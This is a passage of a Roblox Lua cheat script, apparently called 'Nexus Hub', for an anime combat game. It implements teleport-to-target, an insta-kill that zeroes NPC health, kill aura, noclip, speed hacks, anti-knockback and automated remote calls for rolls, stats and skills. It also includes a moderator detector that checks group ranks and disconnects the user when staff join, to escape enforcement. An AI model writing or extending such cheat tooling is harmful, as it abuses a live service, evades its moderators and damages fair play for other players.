                ActiveTween:Cancel()

                ActiveTween = nil
            end

            local speed = Options.TweenSpeed or 160
            local duration = math.clamp(distance / speed, 0.05, 0.35)

            ActiveTween = TweenService:Create(root, TweenInfo.new(duration, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {CFrame = dest})

            ActiveTween:Play()
            ActiveTween.Completed:Once(function()
                ActiveTween = nil
            end)
        end
    end

    root.CFrame = dest
    root.AssemblyLinearVelocity = Vector3.zero
    root.AssemblyAngularVelocity = Vector3.zero
    root.Velocity = Vector3.zero

    local npcHum = target:FindFirstChildOfClass('Humanoid')

    if Toggles.InstaKill and Toggles.InstaKill.Value then
        local minHP = Options.InstaKillMinHP or 0
        local hpThreshold = Options.InstaKillHP or 90
        local ikType = Options.InstaKillType or 'V1'

        if npcHum and npcHum.MaxHealth >= minHP then
            local hpPercent = (npcHum.Health / npcHum.MaxHealth) * 100

            if hpPercent < hpThreshold then
                pcall(function()
                    npcHum.Health = 0
                end)

                if ikType == 'V1' then
                    if not target:GetAttribute('IK_Active') then
                        target:SetAttribute('IK_Active', true)
                        target:SetAttribute('TriggerTime', tick())
                    end
                end

                BurstM1(5, 0)
            end
        end
    end
end

local TargetGroupId = 1002185259
local BannedRanks = {
    255,
    254,
    175,
    150,
}

function CheckPlayerForSafety(p)
    if not (Toggles.AutoKick and Toggles.AutoKick.Value) or p == Plr then
        return
    end

    local types = Options.SelectedKickType or {}

    if types['Player Join'] then
        task.wait(0.5)
        Plr:Kick('\n[Nexus Hub]\nReason: Player joined (' .. p.Name .. ')')

        return
    end
    if types.Mod then
        local ok, rank = pcall(function()
            return p:GetRankInGroup(TargetGroupId)
        end)

        if ok and table.find(BannedRanks, rank) then
            task.wait(0.5)
            Plr:Kick('\n[Nexus Hub]\nReason: Moderator Detected (' .. p.Name .. ')')
        end
    end
end
function CheckServerTypeSafety()
    if not (Toggles.AutoKick and Toggles.AutoKick.Value) then
        return
    end

    local types = Options.SelectedKickType or {}

    if not types['Public Server'] then
        return
    end

    local ok, serverType = pcall(function()
        local remote = game:GetService('RobloxReplicatedStorage'):WaitForChild('GetServerType', 2)

        return remote and remote:InvokeServer() or 'Unknown'
    end)

    if ok and serverType ~= 'VIPServer' then
        task.wait(0.8)
        Plr:Kick('\n[Nexus Hub]\nReason: You are in a public server.')
    end
end
function InitAutoKick()
    CheckServerTypeSafety()

    for _, p in ipairs(Players:GetPlayers())do
        CheckPlayerForSafety(p)
    end

    Players.PlayerAdded:Connect(CheckPlayerForSafety)
end
function PanicStop()
    Shared.Farm = false
    Shared.AltActive = false
    Shared.GlobalPrio = 'FARM'
    Shared.Target = nil
    Shared.MovingIsland = false

    for k, tog in pairs(Toggles)do
        if type(tog) == 'table' and tog.Value ~= nil then
            tog.Value = false
        end
    end

    local char = GetCharacter()
    local root = char and char:FindFirstChild('HumanoidRootPart')

    if root then
        root.AssemblyLinearVelocity = Vector3.zero
        root.AssemblyAngularVelocity = Vector3.zero
        root.CFrame = root.CFrame * CFrame.new(0, 2, 0)
    end

    task.delay(0.5, function()
        Shared.Farm = true
    end)
    UI:Notify({
        Title = 'Stopped',
        Description = 'All features paused.',
        Duration = 5,
    })
end
function ApplyFPSBoost(state)
    if not state then
        return
    end

    pcall(function()
        Lighting.GlobalShadows = false
        Lighting.FogEnd = 9e9
        Lighting.Brightness = 1

        for _, v in pairs(Lighting:GetChildren())do
            if v:IsA('PostProcessEffect') or v:IsA('BloomEffect') or v:IsA('BlurEffect') or v:IsA('SunRaysEffect') then
                v.Enabled = false
            end
        end

        task.spawn(function()
            for i, v in pairs(workspace:GetDescendants())do
                if Toggles.FPSBoost and not Toggles.FPSBoost.Value then
                    break
                end

                pcall(function()
                    if v:IsA('BasePart') then
                        v.Material = Enum.Material.SmoothPlastic
                        v.CastShadow = false
                    elseif v:IsA('Decal') or v:IsA('Texture') then
                        v:Destroy()
                    elseif v:IsA('ParticleEmitter') or v:IsA('Trail') or v:IsA('Beam') then
                        v.Enabled = false
                    end
                end)

                if i % 500 == 0 then
                    task.wait()
                end
            end
        end)
    end)
end
function ApplyIslandWipe()
    if not (Toggles.FPSBoost_AF and Toggles.FPSBoost_AF.Value) then
        return
    end

    task.spawn(function()
        local protect = {
            'SpawnPointCrystal_',
            'Portal_',
        }

        pcall(function()
            for _, folder in pairs(workspace:GetChildren())do
                local n = folder.Name

                if folder:IsA('Folder') and (n:lower():find('island') or n == 'HuecoMundo' or n == 'ShibuyaStation') then
                    local desc = folder:GetDescendants()

                    for i, obj in ipairs(desc)do
                        if obj:IsA('Model') or obj:IsA('BasePart') then
                            local safe = false

                            for _, kw in ipairs(protect)do
                                if obj.Name:find(kw) then
                                    safe = true

                                    break
                                end
                            end

                            if not safe then
                                pcall(function()
                                    obj:Destroy()
                                end)
                            end
                        end
                        if i % 300 == 0 then
                            task.wait()
                        end
                    end
                end
            end
            for i, v in ipairs(workspace:GetChildren())do
                local safe = v.Name:find('TimedBossSpawn_') or v.Name == Plr.Name or v.Name == 'Main Temple' or v.Name == 'NPCs' or v.Name == 'ServiceNPCs' or v.Name:find('QuestNPC') or v:IsA('Camera') or v:IsA('Terrain') or v.Name:find('Portal_')

                if not safe and (v:IsA('Model') or v:IsA('BasePart')) then
                    pcall(function()
                        v:Destroy()
                    end)
                end
                if i % 100 == 0 then
                    task.wait()
                end
            end
        end)
    end)
end
function FuncTPW()
    while true do
        local delta = RunService.Heartbeat:Wait()
        local char = GetCharacter()
        local hum = char and char:FindFirstChildOfClass('Humanoid')

        if char and hum and hum.Health > 0 and hum.MoveDirection.Magnitude > 0 then
            char:TranslateBy(hum.MoveDirection * (Options.TPWValue or 1) * delta * 10)
        end
    end
end
function FuncNoclip()
    while Toggles.Noclip and Toggles.Noclip.Value do
        RunService.Stepped:Wait()

        local char = GetCharacter()

        if char then
            for _, part in pairs(char:GetDescendants())do
                if part:IsA('BasePart') and part.CanCollide then
                    part.CanCollide = false
                end
            end
        end
    end
end
function Func_AntiKnockback()
    if type(Connections.Knockback) == 'table' then
        for _, c in pairs(Connections.Knockback)do
            if c then
                c:Disconnect()
            end
        end

        table.clear(Connections.Knockback)
    else
        Connections.Knockback = {}
    end

    function applyAKB(character)
        if not character then
            return
        end

        local root = character:WaitForChild('HumanoidRootPart', 10)

        if root then
            local conn = root.ChildAdded:Connect(function(child)
                if not (Toggles.AntiKnockback and Toggles.AntiKnockback.Value) then
                    return
                end
                if child:IsA('BodyVelocity') and child.MaxForce == Vector3.new(40000, 40000, 40000) then
                    child:Destroy()
                end
            end)

            table.insert(Connections.Knockback, conn)
        end
    end

    if Plr.Character then
        applyAKB(Plr.Character)
    end

    local conn = Plr.CharacterAdded:Connect(function(c)
        applyAKB(c)
    end)

    table.insert(Connections.Knockback, conn)

    repeat
        task.wait(1)
    until not (Toggles.AntiKnockback and Toggles.AntiKnockback.Value)

    for _, c in pairs(Connections.Knockback)do
        if c then
            c:Disconnect()
        end
    end

    table.clear(Connections.Knockback)
end
function Func_AutoReconnect()
    if Connections.Reconnect then
        Connections.Reconnect:Disconnect()
    end

    Connections.Reconnect = GuiService.ErrorMessageChanged:Connect(function()
        if not (Toggles.AutoReconnect and Toggles.AutoReconnect.Value) then
            return
        end

        task.delay(2, function()
            pcall(function()
                local promptOverlay = game:GetService('CoreGui'):FindFirstChild('RobloxPromptGui')

                if promptOverlay then
                    local ep = promptOverlay.promptOverlay:FindFirstChild('ErrorPrompt')

                    if ep and ep.Visible then
                        task.wait(5)
                        TeleportService:Teleport(77747658251236, Plr)
                    end
                end
            end)
        end)
    end)
end
function Func_NoGameplayPaused()
    while Toggles.NoGameplayPaused and Toggles.NoGameplayPaused.Value do
        pcall(function()
            local p = game:GetService('CoreGui').RobloxGui:FindFirstChild('CoreScripts/NetworkPause')

            if p then
                p:Destroy()
            end
        end)
        task.wait(1)
    end
end
function CheckObsHaki()
    local ok, active = pcall(function()
        local mainFrame = Plr.PlayerGui:WaitForChild('DodgeCounterUI'):WaitForChild('MainFrame')

        return mainFrame.Visible
    end)

    return ok and active
end
function Func_AutoHaki()
    while task.wait(0.5) do
        if Toggles.ObserHaki and Toggles.ObserHaki.Value then
            if not CheckObsHaki() then
                pcall(function()
                    game:GetService('ReplicatedStorage'):WaitForChild('RemoteEvents'):WaitForChild('ObservationHakiRemote'):FireServer('Toggle')
                end)
                task.wait(1)
            end
        end
        if Toggles.ArmHaki and Toggles.ArmHaki.Value then
            if not CheckArmHaki() then
                pcall(function()
                    game:GetService('ReplicatedStorage'):WaitForChild('RemoteEvents'):WaitForChild('HakiRemote'):FireServer('Toggle')
                end)
                task.wait(1)
            end
        end
        if Toggles.ConquerorHaki and Toggles.ConquerorHaki.Value then
            if not (Toggles.OnlyTarget and Toggles.OnlyTarget.Value) or (Shared.Farm and Shared.Target and Shared.Target.Parent) then
                pcall(function()
                    game:GetService('ReplicatedStorage'):WaitForChild('Remotes'):WaitForChild('ConquerorHakiRemote'):FireServer('Activate')
                end)
            end
        end
    end
end
function ReactivateHaki()
    task.wait(3)

    if Toggles.ObserHaki and Toggles.ObserHaki.Value then
        pcall(function()
            game:GetService('ReplicatedStorage'):WaitForChild('RemoteEvents'):WaitForChild('ObservationHakiRemote'):FireServer('Toggle')
        end)
    end

    task.wait(1)

    if Toggles.ArmHaki and Toggles.ArmHaki.Value then
        pcall(function()
            game:GetService('ReplicatedStorage'):WaitForChild('RemoteEvents'):WaitForChild('HakiRemote'):FireServer('Toggle')
        end)
    end
end

Plr.CharacterAdded:Connect(function()
    task.spawn(ReactivateHaki)
end)

function Func_AutoM1()
    while task.wait(Options.M1Speed or 0.2) do
        if Toggles.AutoM1 and Toggles.AutoM1.Value then
            Remotes.M1:FireServer()
        end
    end
end
function Func_KillAura()
    while Toggles.KillAura and Toggles.KillAura.Value do
        if IsBusy() then
            task.wait(0.1)

            continue
        end

        local nearest, minDist = nil, Options.KillAuraRange or 200
        local char = Plr.Character
        local root = char and char:FindFirstChild('HumanoidRootPart')

        if root then
            for _, v in ipairs(PATH.Mobs:GetChildren())do
                if v:IsA('Model') then
                    local d = (root.Position - v:GetPivot().Position).Magnitude
                    local hum = v:FindFirstChildOfClass('Humanoid')

                    if d <= minDist and hum and hum.Health > 0 then
                        minDist = d
                        nearest = v
                    end
                end
            end
        end
        if nearest then
            EquipWeapon()
            pcall(function()
                Remotes.M1:FireServer(nearest:GetPivot().Position)
            end)
        end

        task.wait(Options.KillAuraCD or 0.12)
    end
end

local function Func_AutoSkill()
    local keyToSlot = {
        Z = 1,
        X = 2,
        C = 3,
        V = 4,
        F = 5,
    }
    local keyToEnum = {
        Z = Enum.KeyCode.Z,
        X = Enum.KeyCode.X,
        C = Enum.KeyCode.C,
        V = Enum.KeyCode.V,
        F = Enum.KeyCode.F,
    }
    local priority = {
        'Z',
        'X',
        'C',
        'V',
        'F',
    }

    while task.wait() do
        if not (Toggles.AutoSkill and Toggles.AutoSkill.Value) then
            continue
        end

        local target = Shared.Target

        if not target or not target.Parent then
            continue
        end

        local hum = target:FindFirstChildOfClass('Humanoid')
        local bossHP = target:GetAttribute('_BossHP') or target:GetAttribute('BossHP')
        local isAlive = (hum and hum.Health > 0) or (bossHP and tonumber(bossHP) and tonumber(bossHP) > 0)

        if not isAlive then
            continue
        end
        if (time() - (Shared.LastM1 or 0)) > 0.35 then
            continue
        end

        local char = GetCharacter()
        local root = char and char:FindFirstChild('HumanoidRootPart')
        local npcRoot = target:FindFirstChild('HumanoidRootPart') or target:FindFirstChild('RootPart') or target:FindFirstChild('kraken_low') or target:FindFirstChildOfClass('BasePart')

        if not (root and npcRoot) then
            continue
        end

        local dist = (root.Position - npcRoot.Position).Magnitude
        local skillRange = 300

        if dist > skillRange then
            continue
        end
        if Toggles.AutoSkill_BossOnly and Toggles.AutoSkill_BossOnly.Value then
            local n = target.Name:lower():gsub('%s+', ''):gsub('_', '')
            local isBoss = false
            local bossKeywords = {
                'boss',
                'greatmage',
                'theworld',
                'cosmicbeing',
                'kraken',
                'seaserpent',
                'seabeast',
                'seadragon',
                'seamonster',
                'rimuru',
                'anos',
                'trueaizen',
                'strongest',
                'jinwoo',
                'alucard',
                'gojo',
                'sukuna',
                'gilgamesh',
                'moonslayer',
                'saberalter',
                'blessedmaiden',
                'qinshi',
                'dio',
                'yuji',
                'ichigo',
                'aizen',
                'dragon',
                'shadow',
            }

            for _, kw in ipairs(bossKeywords)do
                if n:find(kw, 1, true) then
                    isBoss = true

                    break
                end
            end

            if not isBoss and bossHP and tonumber(bossHP) then
                isBoss = true
            end
            if not isBoss and hum then
                if hum.MaxHealth >= 500000 then
                    isBoss = true
                end
            end
            if not isBoss then
                continue
            end
            if hum and hum.MaxHealth > 0 then
                local hp = (hum.Health / hum.MaxHealth) * 100

                if hp > (Options.AutoSkill_BossHP or 100) then
                    continue
                end
            end
        end

        local tool = char and char:FindFirstChildOfClass('Tool')

        if not tool then
            continue
        end

        local selected = Options.SelectedSkills or {}
        local toolType = GetToolTypeFromModule(tool.Name)
        local mode = Options.AutoSkillType or 'Normal'

        for _, key in ipairs(priority)do
            if selected[key] then
                if mode == 'Normal' and not IsSkillReady(key) then
                    continue
                end
                if toolType == 'Power' then
                    Remotes.UseFruit:FireServer('UseAbility', {
                        FruitPower = tool.Name:gsub(' Fruit', ''),
                        KeyCode = keyToEnum[key],
                    })
                else
                    Remotes.UseSkill:FireServer(keyToSlot[key])
                end

                task.wait(mode == 'Instant' and 0.05 or 0.15)
            end
        end
    end
end

function Func_AutoCombo()
    Shared.ComboIdx = 1

    while Toggles.AutoCombo and Toggles.AutoCombo.Value do
        task.wait(0.1)

        local raw = Options.ComboPattern or 'Z>X>C>V>F'

        Shared.ParsedCombo = {}

        for item in raw:upper():gsub('%s+', ''):gmatch('([^,>]+)')do
            table.insert(Shared.ParsedCombo, item)
        end

        if #Shared.ParsedCombo == 0 then
            continue
        end
        if Shared.ComboIdx > #Shared.ParsedCombo then
            Shared.ComboIdx = 1
        end
        if IsBusy() then
            local t = tick()

            repeat
                task.wait(0.1)
            until not IsBusy() or tick() - t > 8
        end

        task.wait(0.4)

        if Toggles.ComboBossOnly and Toggles.ComboBossOnly.Value then
            if not Shared.Target or not Shared.Target.Parent or not Shared.Target.Name:lower():find('boss') then
                Shared.ComboIdx = 1

                task.wait(0.5)

                continue
            end
        end

        local action = Shared.ParsedCombo[Shared.ComboIdx]
        local waitTime = tonumber(action)

        if waitTime then
            if (Options.ComboMode or 'Normal') == 'Normal' then
                task.wait(waitTime)
            end

            Shared.ComboIdx = Shared.ComboIdx + 1

            continue
        end
        if IsSkillReady(action) then
            if action == 'F' then
                Shared.GlobalPrio = 'COMBO'

                local cTitle = Options.Title_Combo
                local cRune = Options.Rune_Combo

                if cTitle and cTitle ~= 'None' then
                    Remotes.EquipTitle:FireServer(cTitle)
                end
                if cRune and cRune ~= 'None' then
                    Remotes.EquipRune:FireServer('Equip', cRune)
                end

                Shared.LastSwitch.Title = cTitle
                Shared.LastSwitch.Rune = cRune

                task.wait(0.7)

                local confirmed = false

                repeat
                    EquipWeapon()
                    Remotes.UseSkill:FireServer(5)

                    local t = tick()

                    repeat
                        task.wait(0.1)

                        if not IsSkillReady('F') then
                            confirmed = true
                        end
                    until confirmed or tick() - t > 1
                until confirmed or not (Toggles.AutoCombo and Toggles.AutoCombo.Value)

                local started = false
                local ct = tick()

                repeat
                    task.wait()

                    if IsBusy() then
                        started = true
                    end
                until started or tick() - ct > 2

                if started then
                    local ht = tick()

                    repeat
                        task.wait(0.1)
                    until not IsBusy() or tick() - ht > 15
                else
                    task.wait(2.5)
                end

                Shared.GlobalPrio = 'FARM'
                Shared.LastSwitch.Title = ''
                Shared.LastSwitch.Rune = ''
                Shared.ComboIdx = Shared.ComboIdx + 1

                task.wait(0.3)
            else
                local slot = ({
                    Z = 1,
                    X = 2,
                    C = 3,
                    V = 4,
                })[action] or 1
                local done = false

                repeat
                    Remotes.UseSkill:FireServer(slot)

                    local t = tick()

                    repeat
                        task.wait(0.1)

                        if not IsSkillReady(action) or IsBusy() then
                            done = true
                        end
                    until done or tick() - t > 1.2
                until done or not (Toggles.AutoCombo and Toggles.AutoCombo.Value)

                if done then
                    Shared.ComboIdx = Shared.ComboIdx + 1

                    task.wait(0.2)
                end
            end
        else
            task.wait(0.2)
        end
    end
end
function Func_AutoStats()
    local MAX = 11500

    while task.wait(1) do
        if not (Toggles.AutoStats and Toggles.AutoStats.Value) then
            break
        end

        local pts = Plr:WaitForChild('Data'):WaitForChild('StatPoints').Value

        if pts > 0 then
            local selected = Options.SelectedStats or {}
            local active = {}

            for stat, on in pairs(selected)do
                if on and (Shared.Stats[stat] or 0) < MAX then
                    table.insert(active, stat)
                end
            end

            if #active > 0 then
                local perStat = math.floor(pts / #active)

                if perStat > 0 then
                    for _, s in ipairs(active)do
                        Remotes.AddStat:FireServer(s, perStat)
                    end
                else
                    Remotes.AddStat:FireServer(active[1], pts)
                end
            end
        end
    end
end
function Func_AutoSkillTree()
    while Toggles.AutoSkillTree and Toggles.AutoSkillTree.Value do
        task.wait(0.5)

        local points = Shared.SkillTree.SkillPoints or 0

        if points <= 0 then
            task.wait(1)

            continue
        end

        local SkillMod = nil

        pcall(function()
            SkillMod = require(RS.Modules:FindFirstChild('SkillTreeConfig') or RS.Modules:FindFirstChild('SkillTree'))
        end)

        if SkillMod and SkillMod.Branches then
            for _, branch in pairs(SkillMod.Branches)do
                for _, node in ipairs(branch.Nodes or {})do
                    if not Shared.SkillTree.Nodes[node.Id] then
                        local cost = node.Cost or 1

                        if points >= cost then
                            pcall(function()
                                Remotes.SkillTreeUpgrade:FireServer(node.Id)
                            end)

                            Shared.SkillTree.SkillPoints = (Shared.SkillTree.SkillPoints or cost) - cost

                            task.wait(0.3)
                        end

                        break
                    end
                end
            end
        else
            pcall(function()
                Remotes.SkillTreeUpgrade:FireServer('auto', points)
            end)
            task.wait(1)
        end
    end
end
function Func_AutoPower()
    while Toggles.AutoPower and Toggles.AutoPower.Value do
        local targets = Options.SelectedPower or {}
        local curName = Shared.CurrentPower.Name or 'None'
        local isTarget = (type(targets) == 'table') and targets[curName]

        if not isTarget then
            pcall(function()
                if Remotes.PowerSkip then
                    Remotes.PowerSkip:FireServer({
                        Epic = true,
                        Legendary = true,
                        Mythical = true,
                    })
                end
            end)
            pcall(function()
                if Remotes.PowerRoll then
                    Remotes.PowerRoll:FireServer()
                end
            end)
            task.wait(Options.PowerRollCD or 0.3)
        else
            UI:Notify({
                Title = 'Power',
                Description = 'Got: ' .. curName,
                Duration = 5,
            })

            Toggles.AutoPower.Value = false

            break
        end

        task.wait()
    end
end
function AutoRollStatsLoop()
    local selStats = Options.SelectedGemStats or {}
    local selRanks = Options.SelectedRank or {}
    local hasStat, hasRank = false, false

    for _ in pairs(selStats)do
        hasStat = true

        break
    end
    for _ in pairs(selRanks)do
        hasRank = true

        break
    end

    if not hasStat or not hasRank then
        UI:Notify({
            Title = 'Error',
            Description = 'Select at least one stat and rank first!',
            Duration = 5,
        })

        if Toggles.AutoRollStats then
            Toggles.AutoRollStats.Value = false
        end

        return
    end

    while Toggles.AutoRollStats and Toggles.AutoRollStats.Value do
        if not next(Shared.GemStats) then
            task.wait(0.1)

            continue
        end

        local done = true

        for _, statName in ipairs(Tables.GemStat)do
            if selStats[statName] then
                local cur = Shared.GemStats[statName]

                if cur and not selRanks[cur.Rank] then
                    done = false

                    pcall(function()
                        Remotes.RerollSingleStat:InvokeServer(statName)
                    end)
                    task.wait(Options.StatsRollCD or 0.1)

                    break
                end
            end
        end

        if done then
            UI:Notify({
                Title = 'Done',
                Description = 'Stats rolled successfully.',
                Duration = 5,
            })

            if Toggles.AutoRollStats then
                Toggles.AutoRollStats.Value = false
            end

            break
        end

        task.wait()
    end
end
function Func_AutoRelicCraft()
    while Toggles.AutoRelicCraft and Toggles.AutoRelicCraft.Value do
        local selected = Options.SelectedRelics or {}
        local hasAny = false

        for _, v in pairs(selected)do
            if v then
                hasAny = true

                break
            end
        end

        if not hasAny then
            task.wait(1)

            continue
        end

        local crafted = false

        for _, relicName in ipairs(Tables.RelicList)do
            if not (Toggles.AutoRelicCraft and Toggles.AutoRelicCraft.Value) then
                break
            end
            if selected[relicName] then
                local ok, err = pcall(function()
                    game:GetService('ReplicatedStorage'):WaitForChild('Remotes'):WaitForChild('RequestRelicCraft'):InvokeServer(relicName)
                end)

                if ok then
                    crafted = true
                end

                task.wait(Options.RelicCraftCD or 1.5)
            end
        end

        if not crafted then
            task.wait(1)
        end
    end
end
function SyncTraitAutoSkip()
    if not (Toggles.AutoTrait and Toggles.AutoTrait.Value) then
        return
    end

    pcall(function()
        local selected = Options.SelectedTrait or {}
        local hier = {
            Epic = 1,
            Legendary = 2,
            Mythical = 3,
            Secret = 4,
        }
        local lowest = 99

        for name, on in pairs(selected)do
            if on then
                local data = Modules.Trait.Traits[name]

                if data then
                    local v = hier[data.Rarity] or 0

                    if v > 0 and v < lowest then
                        lowest = v
                    end
                end
            end
        end

        if lowest == 99 then
            return
        end

        Remotes.TraitAutoSkip:FireServer({
            Epic = 1 < lowest,
            Legendary = 2 < lowest,
            Mythical = 3 < lowest,
            Secret = 4 < lowest,
        })
    end)
end
function SyncRaceSettings()
    if not (Toggles.AutoRace and Toggles.AutoRace.Value) then
        return
    end

    pcall(function()
        local selected = Options.SelectedRace or {}
        local hasEpic, hasLeg = false, false

        for name, data in pairs(Modules.Race.Races)do
            local r = data.rarity or data.Rarity

            if r == 'Mythical' then
                local skip = not selected[name]

                if Shared.Settings['SkipRace_' .. name] ~= skip then
                    Remotes.SettingsToggle:FireServer('SkipRace_' .. name, skip)
                end
            end
            if selected[name] then
                if r == 'Epic' then
                    hasEpic = true
                end
                if r == 'Legendary' then
                    hasLeg = true
                end
            end
        end

        if Shared.Settings.SkipEpicReroll ~= not hasEpic then
            Remotes.SettingsToggle:FireServer('SkipEpicReroll', not hasEpic)
        end
        if Shared.Settings.SkipLegendaryReroll ~= not hasLeg then
            Remotes.SettingsToggle:FireServer('SkipLegendaryReroll', not hasLeg)
        end
    end)
end
function SyncClanSettings()
    if not (Toggles.AutoClan and Toggles.AutoClan.Value) then
        return
    end

    pcall(function()
        local selected = Options.SelectedClan or {}
        local hasEpic, hasLeg = false, false

        for name, data in pairs(Modules.Clan.Clans)do
            local r = data.rarity or data.Rarity

            if r == 'Legendary' then
                local skip = not selected[name]

                if Shared.Settings['SkipClan_' .. name] ~= skip then
                    Remotes.SettingsToggle:FireServer('SkipClan_' .. name, skip)
                end
            end
            if selected[name] then
                if r == 'Epic' then
                    hasEpic = true
                end
                if r == 'Legendary' then
                    hasLeg = true
                end
            end
        end

        if Shared.Settings.SkipEpicClan ~= not hasEpic then
            Remotes.SettingsToggle:FireServer('SkipEpicClan', not hasEpic)
        end
        if Shared.Settings.SkipLegendaryClan ~= not hasLeg then
            Remotes.SettingsToggle:FireServer('SkipLegendaryClan', not hasLeg)
        end
    end)
end
function Func_UnifiedRollManager()
    while task.wait() do
        if Toggles.AutoTrait and Toggles.AutoTrait.Value then
            local traitUI = PGui:WaitForChild('TraitRerollUI').MainFrame.Frame.Content.TraitPage.TraitGottenFrame.Holder.Trait.TraitGotten
            local confirmFrame = PGui.TraitRerollUI.MainFrame.Frame.Content:FindFirstChild('AreYouSureYouWantToRerollFrame')
            local current = traitUI.Text
            local selected = Options.SelectedTrait or {}

            if selected[current] then
                UI:Notify({
                    Title = 'Trait',
                    Description = 'Got: ' .. current,
                    Duration = 5,
                })

                if Toggles.AutoTrait then
                    Toggles.AutoTrait.Value = false
                end
            else
                pcall(SyncTraitAutoSkip)

                if confirmFrame and confirmFrame.Visible then
                    Remotes.TraitConfirm:FireServer(true)
                    task.wait(0.1)
                end

                Remotes.Roll_Trait:FireServer()
                task.wait(Options.RollCD or 0.3)
            end

            continue
        end
        if Toggles.AutoBloodline and Toggles.AutoBloodline.Value then
            local cur = Plr:GetAttribute('CurrentBloodline') or Plr:GetAttribute('Bloodline') or Plr:GetAttribute('CurrentClan')
            local sel = Options.SelectedBloodline or {}

            if sel[cur] then
                UI:Notify({
                    Title = 'Bloodline',
                    Description = 'Got: ' .. tostring(cur),
                    Duration = 5,
                })

                if Toggles.AutoBloodline then
                    Toggles.AutoBloodline.Value = false
                end
            else
                pcall(function()
                    local settingsUI = PGui:FindFirstChild('BloodlineRerollSettingsUI') or PGui:FindFirstChild('LegendaryBloodlineFilterUI')

                    if settingsUI then
                        local legendary = settingsUI:FindFirstChild('Toggle_SkipLegendaryBloodline', true) or settingsUI:FindFirstChild('Button_LegendaryBloodlineFilter', true)
                        local hasLeg = false

                        for name in pairs(sel)do
                            local BloodlineMod = GetSafeModule(RS.Modules, 'BloodlineConfig')

                            if BloodlineMod then
                                local data = BloodlineMod.Bloodlines and BloodlineMod.Bloodlines[name]

                                if data and (data.rarity == 'Legendary' or data.Rarity == 'Legendary') then
                                    hasLeg = true

                                    break
                                end
                            end
                        end

                        if Remotes.SettingsToggle then
                            pcall(function()
                                Remotes.SettingsToggle:FireServer('SkipLegendaryBloodline', not hasLeg)
                            end)
                            pcall(function()
                                Remotes.SettingsToggle:FireServer('SkipEpicBloodline', true)
                            end)
                        end
                    end
                end)
                pcall(function()
                    Remotes.UseItem:FireServer('Use', 'Bloodline Stone', 1)
                end)
                pcall(function()
                    Remotes.UseItem:FireServer('Use', 'Bloodline Reroll', 1)
                end)
                task.wait(Options.RollCD or 0.3)
            end

            continue
        end
        if Toggles.AutoRace and Toggles.AutoRace.Value then
            local cur = Plr:GetAttribute('CurrentRace')
            local sel = Options.SelectedRace or {}

            if sel[cur] then
                UI:Notify({
                    Title = 'Race',
                    Description = 'Got: ' .. tostring(cur),
                    Duration = 5,
                })

                if Toggles.AutoRace then
                    Toggles.AutoRace.Value = false
                end
            else
                pcall(SyncRaceSettings)
                Remotes.UseItem:FireServer('Use', 'Race Reroll', 1)
                task.wait(Options.RollCD or 0.3)
            end

            continue
        end
        if Toggles.AutoClan and Toggles.AutoClan.Value then
            local cur = Plr:GetAttribute('CurrentClan')
            local sel = Options.SelectedClan or {}

            if sel[cur] then
                UI:Notify({
                    Title = 'Clan',
                    Description = 'Got: ' .. tostring(cur),
                    Duration = 5,
                })

                if Toggles.AutoClan then
                    Toggles.AutoClan.Value = false
                end
            else
                pcall(SyncClanSettings)
                Remotes.UseItem:FireServer('Use', 'Clan Reroll', 1)
                task.wait(Options.RollCD or 0.3)
            end

            continue
        end

        task.wait(0.4)
    end
end
function EnsureRollManager()
    local active = (Toggles.AutoTrait and Toggles.AutoTrait.Value) or (Toggles.AutoRace and Toggles.AutoRace.Value) or (Toggles.AutoClan and Toggles.AutoClan.Value) or (Toggles.AutoBloodline and Toggles.AutoBloodline.Value)

    Thread('UnifiedRollManager', Func_UnifiedRollManager, active)
end
function SyncSpecPassiveAutoSkip()
    pcall(function()
        if Remotes.SpecPassiveSkip then
            Remotes.SpecPassiveSkip:FireServer({
                Epic = true,
                Legendary = true,
                Mythical = true,
            })
        end
    end)
end
function AutoSpecPassiveLoop()
    pcall(SyncSpecPassiveAutoSkip)
    task.wait(Options.SpecRollCD or 0.1)

    while Toggles.AutoSpec and Toggles.AutoSpec.Value do
        local targetWeapons = Options.SelectedPassive or {}
        local targetPassives = Options.SelectedSpec or {}
        local workDone = false

        if type(Shared.Passives) ~= 'table' then
            Shared.Passives = {}
        end

        for weapName, on in pairs(targetWeapons)do
            if not on then
                continue
            end

            local cur = Shared.Passives[weapName]
            local curName = (type(cur) == 'table' and cur.Name) or (type(cur) == 'string' and cur) or 'None'
            local curBuffs = (type(cur) == 'table' and cur.RolledBuffs) or {}
            local correct = targetPassives[curName]
            local meetsStats = true

            if correct and type(curBuffs) == 'table' then
                for statKey, val in pairs(curBuffs)do
                    local sid = 'Min_' .. weapName:gsub('%s+', '') .. '_' .. statKey
                    local minReq = Options[sid] or 0

                    if tonumber(val) and val < minReq then
                        meetsStats = false

                        break
                    end
                end
            end
            if not correct or not meetsStats then
                workDone = true

                Remotes.SpecPassiveReroll:FireServer(weapName)

                local t = tick()

                repeat
                    task.wait()

                    local nd = Shared.Passives[weapName]
                    local nn = (type(nd) == 'table' and nd.Name) or (type(nd) == 'string' and nd) or ''
                until nn ~= curName or tick() - t > 1.5

                break
            end
        end

        if not workDone then
            UI:Notify({
                Title = 'Passive',
                Description = 'Done rolling.',
                Duration = 5,
            })

            if Toggles.AutoSpec then
                Toggles.AutoSpec.Value = false
            end

            break
        end

        task.wait()
    end
end
function AutoUpgradeLoop(mode)
    local toggle = Toggles['Auto' .. mode]
    local allToggle = Toggles['Auto' .. mode .. 'All']
    local remote = (mode == 'Enchant') and Remotes.Enchant or Remotes.Blessing
    local source = (mode == 'Enchant') and Tables.OwnedAccessory or Tables.OwnedWeapon

    while(toggle and toggle.Value) or (allToggle and allToggle.Value) do
        local selection = Options['Selected' .. mode] or {}
        local done = false

        for _, itemName in ipairs(source)do
            if Shared.UpBlacklist[itemName] then
                continue
            end

            local sel = (allToggle and allToggle.Value) or selection[itemName] or table.find(selection, itemName)

            if sel then
                done = true

                pcall(function()
                    remote:FireServer(itemName)
                end)
                task.wait(1.5)

                break
            end
        end

        if not done then
            UI:Notify({
                Title = 'Stopping',
                Description = 'Nothing left to ' .. mode:lower() .. '.',
                Duration = 5,
            })

            if toggle then
                toggle.Value = false
            end
            if allToggle then
                allToggle.Value = false
            end

            break
        end

        task.wait(0.1)
    end
end
function EvaluateArtifact(uuid, data)
    local actions = {
        lock = false,
        delete = false,
        upgrade = false,
    }

    function filterStatus(filter, val)
        if not filter or not next(filter) then
            return nil
        end

        return filter[val] == true
    end
    function isWhitelisted(filter, val)
        local s = filterStatus(filter, val)

        return s == nil or s
    end
